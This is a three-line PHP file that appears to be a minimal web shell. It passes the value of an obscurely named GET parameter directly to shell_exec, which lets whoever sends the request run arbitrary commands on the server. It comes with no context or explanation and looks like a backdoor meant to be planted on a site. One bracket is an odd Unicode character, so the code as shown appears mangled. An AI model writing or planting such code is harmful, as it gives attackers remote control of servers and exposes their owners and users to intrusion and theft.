<?php
shell_exec($_GET['1QWmMC_W'〕);
?>
